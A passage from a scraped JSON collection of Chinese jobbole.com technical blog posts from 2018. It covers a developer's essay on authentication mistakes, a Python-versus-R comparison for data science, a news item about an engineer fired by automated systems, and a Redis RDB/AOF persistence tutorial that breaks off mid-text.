部分是如何协调的。尽己所能用最快的速度把app赶出来，就是大错特错，我漏掉了一些非常重要的东西：用户在登陆后，是通过cookie来加载的，但是我的app页面没有给加载提供等待时间，而是根据事件顺序来决定先后的，所以服务器会回复说你没有权限。这种错误很少见，而且很难再出现，因为大多数情况下事件都是按照正确的顺序来完成的。而且认证环节也从不检查用户令牌是否失效，如果你不经常访问网站，当发现了没法登上网站后，就需要注销登录再重新登进去。令牌应该在每次发起请求时都进行更新，但我从来都没有时间去理解这些规则。所以这里又产生了时间问题。如果我们一次同时发出几种请求，收到的回复取决于他们到来的顺序，那将来发送请求用到的令牌就是错的。我们卯足劲赶进度，但最终所用的时间还是要比给定的时间多一倍。区别就是我们开发出的app里面漏洞更多了，然后甚而要花更多的时间对漏洞进行追踪和修复。工作中的失误让我尴尬不已，在大家面前感到十分羞愧，因为我把一切都搞砸了。我要说一点：从那之后，我开始花时间学习认证机制，现在已经理解了OAuth,、JWT、刷新令牌和失效。我仔细阅读了许多库里别人写的认证代码，而且建立了基于几种不同语言版本和框架的认证流程。失败是成功之母这是每次失败的经历给予我的启发。只要你愿意学习，几乎每次这样的经历都会让你从中受益。如果人能够从错误中吸取教训，那么就会有所进步。如果一个队员是第一次犯错，我尽量不会对他表现出不满态度，他们往往已经知道自己把事情搞糟了。但我也努力不去苛责那些总是犯错、屡教不改的人，他们也需要被同情。对待犯错，如果你能够做到这四点，那么就会不断进步：对曾经犯过的错误可以自嘲一番从中吸取经验教训在之后努力为自己正名和他人分享，让他人也能从中获益。关于犯错的宝贵价值，我留给你们一则名人轶事：20世纪初期，IBM的总裁托马斯·J·沃森遇到了一位因为多次决策错误让公司损失惨重的员工，当问及是否要开除这个员工时，沃森答道：“不，我刚刚花了60万美元培训了他，我怎么会让其他人雇佣他来获得他的经历呢？”你过去犯过哪些有意思的错？来一起分享吧！1赞1收藏评论关于作者：dimple11简介还没来得及写:）个人主页·我的文章·15", "url_object_id": "6ef1af433054de7bb42416cdfc0fbfd8"},{"title": "数据科学领域，你该选 Python 还是 R ？", "url": "http://blog.jobbole.com/114228/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/dd000831704fa240c532ce5ef32a7094.png"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,2,4, ,·", "content": "原文出处：usejournal译文出处：开源中国根据需求，为了那些希望知道在数据科学方面选择Python还是R编程语言的人，我发布了这篇指导文章。你可能在数据科学方面是个新手，或者你需要在一个项目中选出一个语言，这篇文章可能会帮助到你。非免责声明：在最大的数据科学家雇主之一（Deloitte）中，我是一个数据科学家的管理者。我也对R和Python有几十年的了解。我是个语言不可知论者，但是参与到Python社区已经有15年左右了。还会有第三种选择HadleyWickham,RStudio的首席数据科学家，已经给出了答复“使用‘and’替代‘vs’”。由此，同时使用Python/R是我将提到的第三种选择。这个选项引起了我的好奇心，而且我会在本文末尾介绍这一点。如何比较R和Python下面是这两种语言之间一些值得比较的因素，这并不是一个完全的列表。历史：R和Python具有明显不同的历史，有时候会交叉。社区：通过实际调查发现的很多复杂的社会人类学因素。性能：详尽的比较以及为什么比较起来这么难。第三方支持：模块，代码库，可视化，存储库，组织和开发环境。用例：有些任务和工作类型适合其中一种或者另一种。我们不能和睦相处吗？Python调用R和R调用Python。预测R还是Python：吃你自家的狗粮的一个预测练习。偏好：最终答案。历史简短概要：ABC-&gt;Python发布（1989GuidovanRossum）-&gt;Python2(2000)-&gt;Python3(2008)Fortan-&gt;S(贝尔实验室)-&gt;R发布（1991RossIhaka和RobertGentleman）-&gt;R1.0.0(2000)-&gt;R3.0.2(2013)社区当比较Python和R的用户时，首先要记住的就是：只有50%的Python用户与R重叠那是假定所有R程序员会用“科学和数字（ScientificandNumeric）”来称呼他。我们也确定，无论程序员的等级如何，这个分布都是正确的。要进一步了解Python“宣传”，请阅读关于Python宣传调查结果：https://www.linkedin.com/pulse/python-hype-survey-results-experience-any-drastic-decline-brian-ray/如果我们只看科学和数字社区，这就会把我们带到第二类社区，哪个社区？在所有的科学和数字社区中有一些子社区。尽管也许还会有一些重叠，因为你会怀疑他们与大一些的R/Python社区之间的交互方式确实不同。一些使用Python/R的子社区的例子：深度学习机器学习高级分析预测分析统计探索和数据分析学术可惜研究几乎无穷无尽的计算领域研究然而每个领域看起来都只致力于一个专门社区，你会发现R在如统计和探索之类的领域中更加流行。不久前，你可能会使用R进行构建运行或者做一些非常有意义的探索，而使用的时间比安装Python或者用它来做相同的探索的时候短得多。这一切都被颠覆性的技术改变了，他们是Jupyternotebook和Anaconda。注：JupyterNotebokks：在浏览器中可以编辑Python/R代码；Anaconda：可以为Python和R简单的安装和打包既然你可以在一个方便提供报告和现成的分析的环境启动运行，就已经排除了一个横在那些想要完成这些任务的人和他们喜爱的语言之间的障碍。Python现在可以使用独立于平台的方式打包，而且可以更快的提供快速、低成本的分析比。在社区中影响了语言选择的另一个区别就是“开源”思想。不仅是开源库，还有致力于开源的协作社区的影响。讽刺的是，开源许可软件，像Tensorflow这样的软件到GNUScientificLibrary（各自为Apache和GPL），他们看起来都有Python和R绑定。尽管有R的公共版权，还是有更多人纯粹的支持Python社区。另一方面，看起来有更多的企业支持R，特别是那些有统计方面历史的。最后，考虑到社区和协作，在Github上Python的支持更多。如果我要看最新Python包趋势，我会看到有超过3.5万个关注的Tensorflow之类的项目。相反，如果我看R包的最新趋势，像Shiny，Stan…之类的包，他们都少于2千个关注。性能性能提升很困难，因为有太多的指标和情况需要测试了，也很难基于特定的硬件来测试。一些操作在某个语言里已经做了优化，但其它语言里却还没有实现。确实，你可能会失去一些东西，比如：一些人会抱怨，一些人会离开，整个分析报告也可能会被丢弃。无论如何，生活还是要继续……循环在继续之前，让我们先看一下Python和R是怎么样使用的。在R中，你是如何做循环迭代的呢？R语言有稍微的不同。通过一个快速的完整性检查,包括加载时间和命令行运行时间:R耗时0m0.238s,Python耗时是0m0.147s.再次，这不是一个严谨的测试。一个快速的测试显示Python代码会快很多，通常，这并不是太重要。既然速度不是重点，那数据科学家更关心哪些东西呢？从这两门语言最新的趋势发现，它们被用作命令式语言的能力是一个重要的因素。比如，大多数Python程序员严重依赖Pandas来工作。这又引出了下一个主题：两种语言都有哪些模块和库，它们又是如何实现的？这是一个更有意义的比较。第三方支持包管理工具Python使用PyPi，R使用CRAN，Anaconda同时支持二者。CRAN使用它内部的“install.packages”命令做分发管理。截至目前为止，CRAN上有大约12000个有效的软件包。浏览一下你就会发现，大约二分之一的包是关于数据科学的，占了大约6000个还不止。PyPi上有超过CRAN十倍数量的包，大约141000个左右。其中有大约3700个包被标识为科学工程相关的。当然还有大量的包实际是科学相关的，但并没有被正确标识出来。这两种语言好像并没有受到大量的重复劳动的影响。确实，当我在PyPi上搜索“随机森林”时，我搜到了170个项目，可是，这些包之间又有些许的不同。尽管Python包的数量超过R十倍之多，但做数据科学计算的包的数量却差不多，也许Python更少一些。大量有效的第三方库是非常重要的，所有东西都要从头写是非常痛苦的。同样地，我也希望你做一些工作来回馈社区。速度很重要DataFramesvsPandas可能是一个更有意义和更重要的比较。我们进行一个实验：在进行复制的时候进行一个复杂的遍历，比较两者的执行时间。下面是结果：源代码：http://nbviewer.jupyter.org/gist/brianray/4ce15234e6ac2975b335c8d90a4b6882正如我们看到的结果，Python+Pandas要比原生的RDataFrames快很多。请注意这并不意味着Python要比R快。Pandas是基于C语言写的Numpy库的。想象一下这个！我真正想说的是ggplot2vsmatplotlib。声明：matplotlib是Python社区里我最看重的一个人写的，他教会了我Python，他就是JohnD.Hunter。Matplotlib是一个强大而且可个性化定制的库，虽然不太容易学但是扩展性非常好。ggplot不但不易个性化定制而且可以说更加困难。如果你喜欢漂亮的绘图图案，而且并不需要自定义绘图，R是我的选择。如果你需要做更多的事情选择Matplotlib，他甚至可以帮助与bokeh进行交互。同样，你可能在寻找的ShinnyR对R而言也会增加其交互性。难道我们不能同时使用两种语言吗？有些人可能要问：你为什么不能同时使用两种语言呢？有一些情况你可以同时使用这两个。比如当：你的项目组或组织允许的时候。你能比较容易地同时维护这两种环境。你的代码不需要迁移到另一个系统。你不会给别人制造一些混乱。一些可以使两者同时工作的方法：Python对R的包装器，比如：rpy2，pyRserve，Rpython，…(rpy2扩展在Jupyter中有使用)R也有一些包，比如：rPython，PythonInR，reticulate，rJython，SnakeCharmR，XRPython在Jupyter里，混合这两种语言，举例如下：然后，我们可以传递pandas数据帧，它会通过rpy2被自动转换为R数据帧，传递时加上“-idf”开关。代码源:http://nbviewer.jupyter.org/gist/brianray/734bd54f468d9a6db9171b2cfc98405aR与Python预测Kaggle上的一个用户写了一个关于预测开发人员使用R还是Python的内核。他根据这些数据得出了一些有趣的观察结果:如果你希望明年转向Linux，你更有可能是一个Python用户。如果你研究统计学，你更有可能是R用户。如果你研究计算机科学，你可能是Python用户。如果你年轻（18-24岁），你更可能是Python用户。如果你进行代码竞赛，你更可能是Python用户。如果你明年想使用安卓，你更可能是Python用户。如果你明年想学习SQL，你更可能是R用户。如果你使用MSoffice，你更可能是R用户。如果你明年想使用RasperryPi，你更可能是一个Python用户。如果你是全日制学生，你更可能是Python用户。如果你使用敏捷方法，你更可能是Python用户。如果你对AI的看法是担忧而不是兴奋，你更可能是R用户。偏好当我与AlexMartelli,Googler和StackOverflow的统治者通信时，他向我解释为什么Google开始使用他们官方支持的一些语言。即使在像Google这样的自由精神创新空间，似乎有一些制度。这是在这里能起作用的偏好，公司偏好。除了企业偏好，有些人在组织里经常创造第一。我知道在Deloitte第一个使用R语言的是谁。他仍然在公司，他是数据学家的领军人。重点是，在所有事情上我通常会建议，遵循你的爱。爱你所追随的，引领潮流，爱你所做的。一个合格的声明，虽然我从未成为工具的第一思考着，但如果你正在做一写重要的事情，那可能不是做实验的最佳时机。错误是可能的。然而，每个精心的设计数据科学项目都给数据学家留下了一定的空间。使用其中的一部分来学习和实验。保持开源心态，拥抱多样性。1赞1收藏评论", "url_object_id": "b6c210eac000139f79578c3d3bee89d1"},{"title": "工作 8 个月后，一名工程师竟然被机器解雇了", "url": "http://blog.jobbole.com/114154/", "create_date": "2018-09-13", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fsnj3dqw5ij20hj0cpn3g.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,2,5, ,·", "content": "原文出处：达尔文IbrahimDiallo发表了一篇博客，描述了自己认真地工作却被“强大”的机器系统强制解雇的真实经历，并表示，事情发生的从始至终都没有人能够阻止它。Diallo在文中描述，自己在某天上班时，发现门卡失效，当他找到主管时，又意外发现了自己已经被解雇的邮件，却不知道是谁发的：Diallo随后来到工作岗位，发现自己的Jira（项目与事务跟踪工具）账号被禁用，当他找经理重新启用账号时，系统却不允许经理进行重新启用的操作。Diallo回到办公桌前，发现系统提示他重启电脑，但他知道重启后会导致数据丢失，因此并未进行此操作，可Windows电脑最后却自动重启了，导致几十万条记录丢失，Web界面也不响应了。随后Diallo用他CentOS的机器黑进他的服务器去重启，调试，重启所有访问，然后重新处理所有数据。后来问题终于得到解决，谈到整件事情的起因时，Diallo解释道：我的合同期限是三年，而我仅工作了八个月。原来在我被解雇之前，公司被一家更大的公司收购，而我正是在收购的过程中加入的。当时由于经理的疏忽，没有给我的合同续约，导致合同中止。而按照我们的系统设定，一旦员工合同中止的工作单发出后，系统就会接管一切。所有中止合同所需的工作单会自动发出，每个都会触发其他的工作单。于是就有了我的门卡失效，Windows账号和Jira账号被禁用事情的发生，等等。而这整个过程持续了好几天，期间却没有任何方法能人为中止。我只能以新员工的方式被重新雇佣，意味着我得重新填写各种文件，设置银行卡账号，等联邦快递给我发送新的门卡。作者在文中将整个过程称为：一个简单的自动化错误/功能导致的雪崩。自动化也许给我们的生活和办公带来许多便利，但当机器犯错误时，人必须能够干预。如若不能，可能就会出现上面作者描述的情况，甚至会导致更加严重的问题。想详细了解事件发生的读者可以查看作者的博客原文。1赞收藏评论", "url_object_id": "2967d3141d2e16cd5b82bc162f3a4648"},{"title": "深入学习 Redis（2）：持久化", "url": "http://blog.jobbole.com/114093/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,0,7, ,·", "content": "原文出处：编程迷思前言在上一篇文章中，介绍了Redis的内存模型，从这篇文章开始，将依次介绍Redis高可用相关的知识——持久化、复制(及读写分离)、哨兵、以及集群。本文将先说明上述几种技术分别解决了Redis高可用的什么问题；然后详细介绍Redis的持久化技术，主要是RDB和AOF两种持久化方案；在介绍RDB和AOF方案时，不仅介绍其作用及操作方法，同时介绍持久化实现的一些原理细节及需要注意的问题。最后，介绍在实际使用中，持久化方案的选择，以及经常遇到的问题等。一、Redis高可用概述在介绍Redis高可用之前，先说明一下在Redis的语境中高可用的含义。我们知道，在web服务器中，高可用是指服务器可以正常访问的时间，衡量的标准是在多长时间内可以提供正常服务（99.9%、99.99%、99.999%等等）。但是在Redis语境中，高可用的含义似乎要宽泛一些，除了保证提供正常服务(如主从分离、快速容灾技术)，还需要考虑数据容量的扩展、数据安全不会丢失等。在Redis中，实现高可用的技术主要包括持久化、复制、哨兵和集群，下面分别说明它们的作用，以及解决了什么样的问题。持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。二、Redis持久化概述持久化的功能：Redis是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将Redis中的数据以某种形式(数据或命令)从内存保存到硬盘；当下次Redis重启时，利用持久化文件实现数据恢复。除此之外，为了进行灾难备份，可以将持久化文件拷贝到一个远程位置。Redis持久化分为RDB持久化和AOF持久化：前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于MySQL的binlog）；由于AOF持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此AOF是目前主流的持久化方式，不过RDB持久化仍然有其用武之地。下面依次介绍RDB持久化和AOF持久化；由于Redis各个版本之间存在差异，如无特殊说明，以Redis3.0为准。三、RDB持久化RDB持久化是将当前进程中的数据生成快照保存到硬盘(因此也称作快照持久化)，保存的文件后缀是rdb；当Redis重新启动时，可以读取快照文件恢复数据。1.触发条件RDB持久化的触发分为手动触发和自动触发两种。1)手动触发save命令和bgsave命令都可以生成RDB文件。save命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在Redis服务器阻塞期间，服务器不能处理任何命令请求。而bgsave命令会创建一个子进程，由子进程来负责创建RDB文件，父进程(即Redis主进程)则继续处理请求。此时服务器执行日志如下：bgsave命令执行过程中，只有fork子进程时会阻塞服务器，而对于save命令，整个过程都会阻塞服务器，因此save已基本被废弃，线上环境要杜绝save的使用；后文中也将只介绍bgsave命令。此外，在自动触发RDB持久化时，Redis也会选择bgsave而不是save来进行持久化；下面介绍自动触发RDB持久化的条件。2)自动触发savemn自动触发最常见的情况是在配置文件中通过savemn，指定当m秒内发生n次变化时，会触发bgsave。例如，查看redis的默认配置文件(Linux下为redis根目录下的redis.conf)，可以看到如下配置信息：其中save9001的含义是：当时间到900秒时，如果redis数据发生了至少1次变化，则执行bgsave；save30010和save6010000同理。当三个save条件满足任意一个时，都会引起bgsave的调用。savemn的实现原理Redis的savemn，是通过serverCron函数、dirty计数器、和lastsave时间戳来实现的。serverCron是Redis服务器的周期性操作函数，默认每隔100ms执行一次；该函数对服务器的状态进行维护，其中一项工作就是检查savemn配置的条件是否满足，如果满足就执行bgsave。dirty计数器是Redis服务器维持的一个状态，记录了上一次执行bgsave/save命令后，服务器状态进行了多少次修改(包括增删改)；而当save/bgsave执行完成后，会将dirty重新置为0。例如，如果Redis执行了setmykeyhelloworld，则dirty值会+1；如果执行了saddmysetv1v2v3，则dirty值会+3；注意dirty记录的是服务器进行了多少次修改，而不是客户端执行了多少修改数据的命令。lastsave时间戳也是Redis服务器维持的一个状态，记录的是上一次成功执行save/bgsave的时间。savemn的原理如下：每隔100ms，执行serverCron函数；在serverCron函数中，遍历savemn配置的保存条件，只要有一个条件满足，就进行bgsave。对于每一个savemn条件，只有下面两条同时满足时才算满足：（1）当前时间-lastsave&gt;m（2）dirty&gt;=nsavemn执行日志下图是savemn触发bgsave执行时，服务器打印日志的情况：其他自动触发机制除了savemn以外，还有一些其他情况会触发bgsave：在主从复制场景下，如果从节点执行全量复制操作，则主节点会执行bgsave命令，并将rdb文件发送给从节点执行shutdown命令时，自动执行rdb持久化，如下图所示：2.执行流程前面介绍了触发bgsave的条件，下面将说明bgsave命令的执行流程，如下图所示(图片来源：https://blog.csdn.net/a1007720052/article/details/79126253)：图片中的5个步骤所进行的操作如下：1)Redis父进程首先判断：当前是否在执行save，或bgsave/bgrewriteaof（后面会详细介绍该命令）的子进程，如果在执行则bgsave命令直接返回。bgsave/bgrewriteaof的子进程不能同时执行，主要是基于性能方面的考虑：两个并发的子进程同时执行大量的磁盘写操作，可能引起严重的性能问题。2)父进程执行fork操作创建子进程，这个过程中父进程是阻塞的，Redis不能执行来自客户端的任何命令3)父进程fork后，bgsave命令返回”Backgroundsavingstarted”信息并不再阻塞父进程，并可以响应其他命令4)子进程创建RDB文件，根据父进程内存快照生成临时快照文件，完成后对原有文件进行原子替换5)子进程发送信号给父进程表示完成，父进程更新统计信息3.RDB文件RDB文件是经过压缩的二进制文件，下面介绍关于RDB文件的一些细节。存储路径RDB文件的存储路径既可以在启动前配置，也可以通过命令动态设定。配置：dir配置指定目录，dbfilename指定文件名。默认是Redis根目录下的dump.rdb文件。动态设定：Redis启动后也可以动态修改RDB存储路径，在磁盘损害或空间不足时非常有用；执行命令为configsetdir{newdir}和configsetdbfilename{newFileName}。如下所示(Windows环境)：RDB文件格式RDB文件格式如下图所示（图片来源：《Redis设计与实现》）：其中各个字段的含义说明如下：1)REDIS：常量，保存着”REDIS”5个字符。2)db_version：RDB文件的版本号，注意不是Redis的版本号。3)SELECTDB0pairs：表示一个完整的数据库(0号数据库)，同理SELECTDB3pairs表示完整的3号数据库；只有当数据库中有键值对时，RDB文件中才会有该数据库的信息(上图所示的Redis中只有0号和3号数据库有键值对)；如果Redis中所有的数据库都没有键值对，则这一部分直接省略。其中：SELECTDB是一个常量，代表后面跟着的是数据库号码；0和3是数据库号码；pairs则存储了具体的键值对信息，包括key、value值，及其数据类型、内部编码、过期时间、压缩信息等等。4)EOF：常量，标志RDB文件正文内容结束。5)check_sum：前面所有内容的校验和；Redis在载入RBD文件时，会计算前面的校验和并与check_sum值比较，判断文件是否损坏。压缩Redis默认采用LZF算法对RDB文件进行压缩。虽然压缩耗时，但是可以大大减小RDB文件的体积，因此压缩默认开启；可以通过命令关闭：需要注意的是，RDB文件的压缩并不是针对整个文件进行的，而是对数据库中的字符串进行的，且只有在字符串达到一定长度(20字节)时才会进行。4.启动时加载RDB文件的载入工作是在服务器启动时自动执行的，并没有专门的命令。但是由于AOF的优先级更高，因此当AOF开启时，Redis会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会在Redis服务器启动时检测RDB文件，并自动载入。服务器载入RDB文件期间处于阻塞状态，直到载入完成为止。Redis启动日志中可以看到自动载入的执行：Redis载入RDB文件时，会对RDB文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。5.RDB常用配置总结下面是RDB常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。savemn：bgsave自动触发的条件；如果没有savemn配置，相当于自动的RDB持久化关闭，不过此时仍可以通过其他方式触发stop-writes-on-bgsave-erroryes：当bgsave出现错误时，Redis是否停止执行写命令；设置为yes，则当硬盘出现问题时，可以及时发现，避免数据的大量丢失；设置为no，则Redis无视bgsave的错误继续执行写命令，当对Redis服务器的系统(尤其是硬盘)使用了监控时，该选项考虑设置为nordbcompressionyes：是否开启RDB文件压缩rdbchecksumyes：是否开启RDB文件的校验，在写入文件和读取文件时都起作用；关闭checksum在写入文件和启动文件时大约能带来10%的性能提升，但是数据损坏时无法发现dbfilenamedump.rdb：RDB文件名dir./：RDB文件和AOF文件所在目录四、AOF持久化RDB持久化是将进程数据写入文件，而AOF持久化(即AppendOnlyFile持久化)，则是将Redis执行的每次写命令记录到单独的日志文件中（有点像MySQL的binlog）；当Redis重启时再次执行AOF文件中的命令来恢复数据。与RDB相比，AOF的实时性更好，因此已成为主流的持久化方案。1.开启AOFRedis服务器默认开启RDB，关闭AOF；要开启AOF，需要在配置文件中配置：appendonlyyes2.执行流程由于需要记录Redis的每条写命令，因此AOF不需要触发，下面介绍AOF的执行流程。AOF的执行流程包括：命令追加(append)：将Redis的写命令追加到缓冲区aof_buf；文件写入(write)和文件同步(sync)：根据不同的同步策略将aof_buf中的内容同步到硬盘；文件重写(rewrite)：定期重写AOF文件，达到压缩的目的。1)命令追加(append)Redis先将写命令追加到缓冲区，而不是直接写入文件，主要是为了避免每次有写命令都直接写入硬盘，导致硬盘IO成为Redis负载的瓶颈。命令追加的格式是Redis命令请求的协议格式，它是一种纯文本格式，具有兼容性好、可读性强、容易处理、操作简单避免二次开销等优点；具体格式略。在AOF文件中，除了用于指定数据库的select命令（如select0为选中0号数据库）是由Redis添加的，其他都是客户端发送来的写命令。2)文件写入(write)和文件同步(sync)Redis提供了多种AOF缓存区的同步文件策略，策略涉及到操作系统的write函数和fsync函数，说明如下：为了提高文件写入效率，在现代操作系统中，当用户调用write函数将数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区被填满或超过了指定时限后，才真正将缓冲区的数据写入到硬盘里。这样的操作虽然提高了效率，但也带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失；因此系统同时提供了fsync、fdatasync等同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保数据的安全性。AOF缓存区的同步文件策略由参数appendfsync控制，各个值的含义如下：always：命令写入aof_buf后立即调用系统fsync操作同步到AOF文件，fsync完成后线程返回。这种情况下，每次有写命令都要同步到AOF文件，硬盘IO成为性能瓶颈，Redis只能支持大约几百TPS写入，严重降低了Redis的性能；即便是使用固态硬盘（SSD），每秒大约也只能处理几万个命令，而且会大大降低SSD的寿命。no：命令写入aof_buf后调用系统write操作，不对AOF文件做fsync同步；同步由操作系统负责，通常同步周期为30秒。这种情况下，文件同步的时间不可控，且缓冲区中堆积的数据会很多，数据安全性无法保证。everysec：命令写入aof_buf后调用系统write操作，write完成后线程返回；fsync同步文件操作由专门的线程每秒调用一次。everysec是前述两种策略的折中，是性能和数据安全性的平衡，因此是Redis的默认配置，也是我们推荐的配置。3)文件重写(rewrite)随着时间流逝，Redis服务器执行的写命令越来越多，AOF文件也会越来越大；过大的AOF文件不仅会影响服务器的正常运行，也会导致数据恢复需要的时间过长。文件重写是指定期重写AOF文件，减小AOF文件的体积。需要注意的是，AOF重写是把Redis进程内的数据转化为写命令，同步到新的AOF文件；不会对旧的AOF文件进行任何读取、写入操作!关于文件重写需要注意的另一点是：对于AOF持久化来说，文件重写虽然是强烈推荐的，但并不是必须的；即使没有文件重写，数据也可以被持久化并在Redis启动的时候导入；因此在一些实现中，会关闭自动的文件重写，然后通过定时任务在每天的某一时刻定时执行。文件重写之所以能够压缩AOF文件，原因在于：过期的数据不再写入文件无效的命令不再写入文件：如有些数据被重复设值(setmykeyv1,setmykeyv2)、有些数据被删除了(saddmysetv1,delmyset)等等多条命令可以合并为一个：如saddmysetv1,saddmysetv2,saddmysetv3可以合并为saddmysetv1v2v3。不过为了防止单条命令过大造成客户端缓冲区溢出，对于list、set、hash、zset类型的key，并不一定只使用一条命令；而是以某个常量为界将命令拆分为多条。这个常量在redis.h/REDIS_AOF_REWRITE_ITEMS_PER_CMD中定义，不可更改，3.0版本中值是64。通过上述内容可以看出，由于重写后AOF执行的命令减少了，文件重写既可以减少文件占用的空间，也可以加快恢复速度。文件重写的触发文件重写的触发，分为手动触发和自动触发：手动触发：直接调用bgrewriteaof命令，该命令的执行与bgsave有些类似：都是fork子进程进行具体的工作，且都只有在fork时阻塞。此时服务器执行日志如下：自动触发：根据auto-aof-rewrite-min-size和auto-aof-rewrite-percentage参数，以及aof_current_size和aof_base_size状态确定触发时机。auto-aof-rewrite-min-size：执行AOF重写时，文件的最小体积，默认值为64MB。auto-aof-rewrite-percentage：执行AOF重写时，当前AOF大小(即aof_current_size)和上一次重写时AOF大小(aof_base_size)的比值。其中，参数可以通过configget命令查看：状态可以通过infopersistence查看：只有当auto-aof-rewrite-min-size和auto-aof-rewrite-percentage两个参数同时满足时，才会自动触发AOF重写，即bgrewriteaof操作。自动触发bgrewriteaof时，可以看到服务器日志如下：文件重写的流程文件重写流程如下图所示(图片来源：http://www.cnblogs.com/yangmingxianshen/p/8373205.html)：关于文件重写的流程，有两点需要特别注意：(1)重写由父进程fork子进程进行；(2)重写期间Redis执行的写命令，需要追加到新的AOF文件中，为此Redis引入了aof_rewrite_buf缓存。对照上图，文件重写的流程如下：1)Redis父进程首先判断当前是否存在正在执行bgsave/bgrewriteaof的子进程，如果存在则bgrewriteaof命令直接返回，如果存在bgsave命令则等bgsave执行完成后再执行。前面曾介绍过，这个主要是基于性能方面的考虑。2)父进程执行fork操作创建子进程，这个过程中父进程是阻塞的。3.1)父进程fork后，bgrewriteaof命令返回”Backgroundappendonlyfilerewritestarted”信息并不再阻塞父进程，并可以响应其他命令。Redis的所有写命令依然写入AOF缓冲区，并根据appendfsync策略同步到硬盘，保证原有AOF机制的正确。3.2)由于fork操作使用写时复制技术，子进程只能共享fork操作时的内存数据。由于父进程依然在响应命令，因此Redis使用AOF重写缓冲区(图中的aof_rewrite_buf)保存这部分数据，防止新AOF文件生成期间丢失这部分数据。也就是说，bgrewriteaof执行期间，Redis的写命令同时追加到aof_buf和aof_rewirte_buf两个缓冲区。4)子进程根据内存快照，按照命令合并规则写入到新的AOF文件。5.1)子进程写完新的AOF文件后，向父进程发信号，父进程更新统计信息，具体可以通过infopersistence查看。5.2)父进程把AOF重写缓冲区的数据写入到新的AOF文件，这样就保证了新AOF文件所保存的数据库状态和服务器当前状态一致。5.3)使用新的AOF文件替换老文件，完成AOF重写。3.启动时加载前面提到过，当AOF开启时，Redis启动时会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会载入RDB文件恢复数据。当AOF开启，且AOF文件存在时，Redis启动日志：当AOF开启，但AOF文件不存在时，即使RDB文件存在也不会加载(更早的一些版本可能会加载，但3.0不会)，Redis启动日志如下：文件校验与载入RDB文件类似，Redis载入AOF文件时，会对AOF文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。但如果是AOF文件结尾不完整(机器突然宕机等容易导致文件尾部不完整)，且aof-load-truncated参数开启，则日志中会输出警告，Redis忽略掉AOF文件的尾部，启动成功。aof-load-truncated参数默认是开启的：伪客户端因为Redis的命令只能在客户端上下文中执行，而载入AOF文件时命令是直接从文件中读取的，并不是由客户端发送；因此Redis服务器在载入AOF文件之前，会创建一个没有网络连接的客户端，之后用它来执行AOF文件中的命令，命令执行的效果与带网络连接的客户端完全一样。4.AOF常用配置总结下面是AOF常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。appendonlyno：是否开启AOFappendfilename“appendonly.aof”：AOF文件名dir./：RDB文件和AOF文件所在目录appendfsynceverysec：fsync持久化策略no-appendfsync-on-rewriteno：AOF重写期间是否禁止fsync；如果开启该选项，可以减轻文件重写时CPU和硬盘的负载（尤其是硬盘），但是可能会丢失AOF重写期间的数据；需要在负载和安全性之间进行平衡auto-aof-rewrite-percentage100：文件重写触发条件之一auto-aof-rewrite-min-size64mb：文件重写触发提交之一aof-load-truncatedyes：如果AOF文件结尾损坏，Redis启动时是否仍载入AOF文件五、方案选择与常见问题前面介绍了RDB和AOF两种持久化方案的细节，下面介绍RDB和AOF的特点、如何选择持久化方案，以及在持久化过程中常遇到的问题等。1.RDB和AOF的优缺点RDB和AOF各有优缺点：RDB持久化优点：RDB文件紧凑，体积小，网络传输快，适合全量复制；恢复速度比AOF快很多。当然，与AOF相比，RDB最重要的优点之一是对性能的影响相对较小。缺点：RDB文件的致命缺点在于其数据快照的持久化方式决定了必然做不到实时持久化，而在数据越来越重要的今天，数据的大量丢失很多时候是无法接受的，因此AOF持久化成为主流。此外，RDB文件需要满足特定格式，兼容性差（如老版本的Redis不兼容新版本的RDB文件）。AOF持久化与RDB持久化相对应，AOF的优点在于支持秒级持久化、兼容性好，缺点是文件大、恢复速度慢、对性能影响大。2.持久化策略选择在介绍持久化策略之前，首先要明白无论是RDB还是AOF，持久化的开启都是要付出性能方面代价的：对于RDB持久化，一方面是bgsave在进行fork操作时Redis主进程会阻塞，另一方面，子进程向硬盘写数据也会带来IO压力；对于AOF持久化，向硬盘写数据的频率大大提高(everysec策略下为秒级)，IO压力更大，甚至可能造成AOF追加阻塞问题（后面会详细介绍这种阻塞），此外，AOF文件的重写与RDB的bgsave类似，会有fork时的阻塞和子进程的IO压力问题。相对来说，由于AOF向硬盘中写数据的频率更高，因此对Redis主进程性能的影响会更大。在实际生产环境中，根据数据量、应用对数据的安全要求、预算限制等不同情况，会有各种各样的持久化策略；如完全不使用任何持久化、使用RDB或AOF的一种，或同时开启RDB和AOF持久化等。此外，持久化的选择必须与Redis的主从策略一起考虑，因为主从复制与持